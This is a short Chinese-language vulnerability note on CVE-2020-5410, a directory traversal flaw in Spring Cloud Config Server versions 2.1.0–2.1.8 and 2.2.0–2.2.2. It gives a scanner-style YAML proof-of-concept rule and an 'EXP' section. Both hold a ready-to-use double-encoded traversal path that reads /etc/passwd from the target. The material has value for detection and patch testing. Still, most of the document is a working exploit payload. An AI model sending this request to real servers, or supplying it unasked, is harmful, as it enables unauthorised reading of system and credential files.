## 漏洞概述

Spring Cloud Config、2.2.3 之前的 2.2.x 版、2.1.9 之前的 2.1.x 版以及不受支持的旧版本允许应用程序通过 spring-cloud-config-server 模块提供任意配置文件。恶意用户或攻击者可以使用特制的 URL 发送请求，从而导致目录遍历攻击。

## 影响范围

```http
Spring Cloud Config
2.1.0 to 2.1.8
2.2.0 to 2.2.2
```

## POC

```http
name: poc-yaml-spring-cloud-cve-2020-5410
rules:
  - method: GET
    path: >-
      /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/a
    expression: |
      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
detail:
  author: Soveless(https://github.com/Soveless)
  Affected Version: "Spring Cloud Config 2.2.x < 2.2.3, 2.1.x < 2.1.9"
  links:
    - https://xz.aliyun.com/t/7877
```

## EXP

```http
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/a
```

